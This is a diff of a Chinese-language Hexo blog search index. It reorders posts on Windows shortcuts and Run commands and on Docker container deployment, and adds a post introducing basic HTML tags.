@@ -1,149 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Basics</title>
-    <url>/2023/07/26/Basics/</url>
-    <content><![CDATA[<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><span id="more"></span>
-
-<h3 id="一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。"><a href="#一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。" class="headerlink" title="一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。"></a>一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。</h3><p>标准行为：<br>Windovws 文件系统将文件和目录名称视为不区分大小写。 FOO.txt 和 foo.txt 将被视为等效文件。<br>Linux 文件系统将文件和目录名称视为区分大小写。 FOO.txt 和 foo.txt 将被视为不同文件。</p>
-<p>Windows 文件系统支持使用属性标志按目录设置区分大小写。 虽然标准行为是不区分大小写，但你可以分配属性标志来使目录区分大小写，以便它能够识别可能仅大小写不同的 Linux 文件和文件夹。<br>在将驱动器装载到适用于 Linux 的 Windows 子系统 (WSL) 文件系统时，尤其如此。 在 WSL 文件系统中工作时，运行的是 Linux，因此默认情况下，文件和目录被视为区分大小写。</p>
-<h3 id="二、Windows-常用快捷键"><a href="#二、Windows-常用快捷键" class="headerlink" title="二、Windows 常用快捷键"></a>二、Windows 常用快捷键</h3><blockquote>
-<p>1 保存 Ctrl + S 必用<br>2 复制 Ctrl + C<br>3 粘贴 Ctrl + V<br>4 剪切 Ctrl + X<br>5 撤销 Ctrl + Z<br>6 全选 Ctrl + A<br>7 显示桌面 Win + D<br>8 打开资源管理器（此电脑） Win + E<br>9 关闭窗口、浏览器标签 Ctrl + W<br>10 切换打开的程序窗口 Alt + Tab<br>11 新建文件夹 Ctrl + Shift + N<br>12 刷新 Ctrl + R<br>13【浏览器快捷键】恢复 Chrome 中刚被关掉的网页Ctrl + Shift + T<br>14【浏览器快捷键】地址栏搜索Ctrl + E<br>15【浏览器快捷键】全选地址栏内容Ctrl + L<br>16【浏览器快捷键】标签之间切换 Ctrl + Tab<br>17 删除文件（进回收站） Ctrl + D<br>18 彻底删除文件 Shift + Delete<br>19 打开任务管理器 Ctrl + Shift + Esc<br>20 锁定计算机 Win + L<br>21 打印 Ctrl + P<br>22 投影 Win + P<br>23 打开 Windows 常用功能列表 Win + X</p>
-</blockquote>
-<h3 id="三、Windows-运行命令"><a href="#三、Windows-运行命令" class="headerlink" title="三、Windows 运行命令"></a>三、Windows 运行命令</h3><table>
-<thead>
-<tr>
-<th align="center">作用</th>
-<th align="center">命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">打开运行窗口</td>
-<td align="center">Win + R</td>
-</tr>
-<tr>
-<td align="center">打开运行窗口</td>
-<td align="center">Win + R</td>
-</tr>
-<tr>
-<td align="center">打开控制面板</td>
-<td align="center">control</td>
-</tr>
-<tr>
-<td align="center">打开计算器</td>
-<td align="center">calc</td>
-</tr>
-<tr>
-<td align="center">打开记事本</td>
-<td align="center">notepad</td>
-</tr>
-<tr>
-<td align="center">打开任务管理器</td>
-<td align="center">taskmgr</td>
-</tr>
-<tr>
-<td align="center">打开系统配置</td>
-<td align="center">msconfig</td>
-</tr>
-<tr>
-<td align="center">打开注册表</td>
-<td align="center">regedit</td>
-</tr>
-<tr>
-<td align="center">打开卸载程序界面</td>
-<td align="center">appwiz.cpl</td>
-</tr>
-<tr>
-<td align="center">打开防火墙设置</td>
-<td align="center">firewall.cpl</td>
-</tr>
-<tr>
-<td align="center">打开系统服务</td>
-<td align="center">services.msc</td>
-</tr>
-<tr>
-<td align="center">打开网络连接</td>
-<td align="center">ncpa.cpl</td>
-</tr>
-<tr>
-<td align="center">打开系统属性</td>
-<td align="center">sysdm.cpl</td>
-</tr>
-<tr>
-<td align="center">快速启动任务栏软件</td>
-<td align="center">Win + （1 ~ 9）</td>
-</tr>
-<tr>
-<td align="center">用命令关机</td>
-<td align="center">shutdown -s -t 0</td>
-</tr>
-<tr>
-<td align="center">用命令重启</td>
-<td align="center">shutdown -r -t 0</td>
-</tr>
-<tr>
-<td align="center">炫酷下滑关机</td>
-<td align="center">slideToShutDown(在桌面新建“关机.txt”，在文件里输入 SlideToShutDown，再把 文件名改为“关 机.bat”，双击这个文件，自己看看效果~~~~)</td>
-</tr>
-</tbody></table>
-<h3 id="四、必装软件"><a href="#四、必装软件" class="headerlink" title="四、必装软件"></a>四、必装软件</h3><ol>
-<li><p>Everything：免费，本地硬盘文件极速搜索工具 （必用）<br>官网下载： <a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p>
-</li>
-<li><p>Wox：免费，效率神器 （必用）<br>百度搜索 Wox 下载或官网下载：<a href="https://github.com/Wox-launcher/Wox">https://github.com/Wox-launcher/Wox</a></p>
-</li>
-<li><p>程序员必用：Markdown 工具（Typora 版本：v0.9.86） （必用）</p>
-</li>
-</ol>
-<p>  Markdown 教程：<a href="https://www.runoob.com/markdown/md-tutorial.html">https://www.runoob.com/markdown/md-tutorial.html</a></p>
-<ol start="4">
-<li>Notepad++ ：免费，功能强大的文本编辑器 （常用）</li>
-</ol>
-<p>  官网下载：<a href="https://notepad-plus.en.softonic.com/">https://notepad-plus.en.softonic.com/</a></p>
-<ol start="5">
-<li>VS Code：编程神器，可开发多种语言，多用于前端开发 （常用）</li>
-</ol>
-<p>  官网下载：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
-<ol start="6">
-<li>FDM：免费，非常棒的下载工具</li>
-</ol>
-<p>​       官网下载：<a href="https://www.freedownloadmanager.org/zh/download.htm">https://www.freedownloadmanager.org/zh/download.htm</a></p>
-<ol start="7">
-<li>Chrome、Firefox：程序员用的浏览器，调试 Web 前端 （必用）</li>
-</ol>
-<p>​        百度搜索：Chrome 下载、Firefox 下载</p>
-]]></content>
-      <tags>
-        <tag>Windows常用快捷键</tag>
-        <tag>Windows运行命令</tag>
-        <tag>必备软件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Docker相关部署</title>
-    <url>/2023/07/31/Docker2/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
-
-<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>
-
-<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>
-
-<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
-
-<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>
-
-<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
-<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docke精髓</title>
     <url>/2023/08/01/Docke3/</url>
     <content><![CDATA[<h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><span id="more"></span>
@@ -396,6 +253,337 @@
       </tags>
   </entry>
   <entry>
+    <title>Basics</title>
+    <url>/2023/07/26/Basics/</url>
+    <content><![CDATA[<h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><span id="more"></span>
+
+<h3 id="一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。"><a href="#一-使用-Linux-和-Windows-文件和目录时，可能需要调整区分大小写的处理方式。" class="headerlink" title="一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。"></a>一.使用 Linux 和 Windows 文件和目录时，可能需要调整区分大小写的处理方式。</h3><p>标准行为：<br>Windovws 文件系统将文件和目录名称视为不区分大小写。 FOO.txt 和 foo.txt 将被视为等效文件。<br>Linux 文件系统将文件和目录名称视为区分大小写。 FOO.txt 和 foo.txt 将被视为不同文件。</p>
+<p>Windows 文件系统支持使用属性标志按目录设置区分大小写。 虽然标准行为是不区分大小写，但你可以分配属性标志来使目录区分大小写，以便它能够识别可能仅大小写不同的 Linux 文件和文件夹。<br>在将驱动器装载到适用于 Linux 的 Windows 子系统 (WSL) 文件系统时，尤其如此。 在 WSL 文件系统中工作时，运行的是 Linux，因此默认情况下，文件和目录被视为区分大小写。</p>
+<h3 id="二、Windows-常用快捷键"><a href="#二、Windows-常用快捷键" class="headerlink" title="二、Windows 常用快捷键"></a>二、Windows 常用快捷键</h3><blockquote>
+<p>1 保存 Ctrl + S 必用<br>2 复制 Ctrl + C<br>3 粘贴 Ctrl + V<br>4 剪切 Ctrl + X<br>5 撤销 Ctrl + Z<br>6 全选 Ctrl + A<br>7 显示桌面 Win + D<br>8 打开资源管理器（此电脑） Win + E<br>9 关闭窗口、浏览器标签 Ctrl + W<br>10 切换打开的程序窗口 Alt + Tab<br>11 新建文件夹 Ctrl + Shift + N<br>12 刷新 Ctrl + R<br>13【浏览器快捷键】恢复 Chrome 中刚被关掉的网页Ctrl + Shift + T<br>14【浏览器快捷键】地址栏搜索Ctrl + E<br>15【浏览器快捷键】全选地址栏内容Ctrl + L<br>16【浏览器快捷键】标签之间切换 Ctrl + Tab<br>17 删除文件（进回收站） Ctrl + D<br>18 彻底删除文件 Shift + Delete<br>19 打开任务管理器 Ctrl + Shift + Esc<br>20 锁定计算机 Win + L<br>21 打印 Ctrl + P<br>22 投影 Win + P<br>23 打开 Windows 常用功能列表 Win + X</p>
+</blockquote>
+<h3 id="三、Windows-运行命令"><a href="#三、Windows-运行命令" class="headerlink" title="三、Windows 运行命令"></a>三、Windows 运行命令</h3><table>
+<thead>
+<tr>
+<th align="center">作用</th>
+<th align="center">命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">打开运行窗口</td>
+<td align="center">Win + R</td>
+</tr>
+<tr>
+<td align="center">打开运行窗口</td>
+<td align="center">Win + R</td>
+</tr>
+<tr>
+<td align="center">打开控制面板</td>
+<td align="center">control</td>
+</tr>
+<tr>
+<td align="center">打开计算器</td>
+<td align="center">calc</td>
+</tr>
+<tr>
+<td align="center">打开记事本</td>
+<td align="center">notepad</td>
+</tr>
+<tr>
+<td align="center">打开任务管理器</td>
+<td align="center">taskmgr</td>
+</tr>
+<tr>
+<td align="center">打开系统配置</td>
+<td align="center">msconfig</td>
+</tr>
+<tr>
+<td align="center">打开注册表</td>
+<td align="center">regedit</td>
+</tr>
+<tr>
+<td align="center">打开卸载程序界面</td>
+<td align="center">appwiz.cpl</td>
+</tr>
+<tr>
+<td align="center">打开防火墙设置</td>
+<td align="center">firewall.cpl</td>
+</tr>
+<tr>
+<td align="center">打开系统服务</td>
+<td align="center">services.msc</td>
+</tr>
+<tr>
+<td align="center">打开网络连接</td>
+<td align="center">ncpa.cpl</td>
+</tr>
+<tr>
+<td align="center">打开系统属性</td>
+<td align="center">sysdm.cpl</td>
+</tr>
+<tr>
+<td align="center">快速启动任务栏软件</td>
+<td align="center">Win + （1 ~ 9）</td>
+</tr>
+<tr>
+<td align="center">用命令关机</td>
+<td align="center">shutdown -s -t 0</td>
+</tr>
+<tr>
+<td align="center">用命令重启</td>
+<td align="center">shutdown -r -t 0</td>
+</tr>
+<tr>
+<td align="center">炫酷下滑关机</td>
+<td align="center">slideToShutDown(在桌面新建“关机.txt”，在文件里输入 SlideToShutDown，再把 文件名改为“关 机.bat”，双击这个文件，自己看看效果~~~~)</td>
+</tr>
+</tbody></table>
+<h3 id="四、必装软件"><a href="#四、必装软件" class="headerlink" title="四、必装软件"></a>四、必装软件</h3><ol>
+<li><p>Everything：免费，本地硬盘文件极速搜索工具 （必用）<br>官网下载： <a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p>
+</li>
+<li><p>Wox：免费，效率神器 （必用）<br>百度搜索 Wox 下载或官网下载：<a href="https://github.com/Wox-launcher/Wox">https://github.com/Wox-launcher/Wox</a></p>
+</li>
+<li><p>程序员必用：Markdown 工具（Typora 版本：v0.9.86） （必用）</p>
+</li>
+</ol>
+<p>  Markdown 教程：<a href="https://www.runoob.com/markdown/md-tutorial.html">https://www.runoob.com/markdown/md-tutorial.html</a></p>
+<ol start="4">
+<li>Notepad++ ：免费，功能强大的文本编辑器 （常用）</li>
+</ol>
+<p>  官网下载：<a href="https://notepad-plus.en.softonic.com/">https://notepad-plus.en.softonic.com/</a></p>
+<ol start="5">
+<li>VS Code：编程神器，可开发多种语言，多用于前端开发 （常用）</li>
+</ol>
+<p>  官网下载：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
+<ol start="6">
+<li>FDM：免费，非常棒的下载工具</li>
+</ol>
+<p>​       官网下载：<a href="https://www.freedownloadmanager.org/zh/download.htm">https://www.freedownloadmanager.org/zh/download.htm</a></p>
+<ol start="7">
+<li>Chrome、Firefox：程序员用的浏览器，调试 Web 前端 （必用）</li>
+</ol>
+<p>​        百度搜索：Chrome 下载、Firefox 下载</p>
+]]></content>
+      <tags>
+        <tag>Windows常用快捷键</tag>
+        <tag>Windows运行命令</tag>
+        <tag>必备软件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Docker相关部署</title>
+    <url>/2023/07/31/Docker2/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
+
+<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>
+
+<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>
+
+<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
+
+<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>
+
+<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
+<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML</title>
+    <url>/2023/08/08/HTML/</url>
+    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
+
+<ol>
+<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
+</li>
+<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
+</li>
+<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
+</li>
+<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
+</li>
+<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
+</li>
+<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
+</li>
+<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
+</li>
+<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
+</li>
+<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
+</li>
+<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
+</li>
+<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
+</li>
+<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
+</li>
+<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
+</li>
+<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
+</li>
+<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
+</li>
+<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
+</li>
+<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
+</li>
+<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
+</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
